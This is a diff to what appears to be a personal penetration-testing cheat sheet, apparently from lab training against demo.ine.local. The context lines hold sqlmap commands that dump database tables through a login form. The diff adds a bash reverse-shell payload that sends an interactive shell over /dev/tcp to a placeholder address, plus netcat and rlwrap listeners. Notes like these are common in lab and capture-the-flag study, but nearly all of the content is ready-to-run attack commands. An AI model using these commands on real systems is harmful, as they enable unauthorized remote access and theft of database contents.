@@ -163,7 +163,22 @@ sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&p
 sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&password=ss&login-php-submit-button=Login" -p username --banner -D database --dump -T table --threads 10
 ```
 
+# Simple Linux reverse shell
 
-common ports 
+## Payload
+```
+#!/bin/bash
+bash -c "bash -i >& /dev/tcp/$IP/$PORT 0>&1" 
+```
+## Listener
+```bash
+nc -lvp $PORT
+```
+For comfort
+```bash
+rlwrap nc -lvp $PORT
+```
+
+# Common ports 
 
 21,22,25,53,443,5000,8000,8080,3306
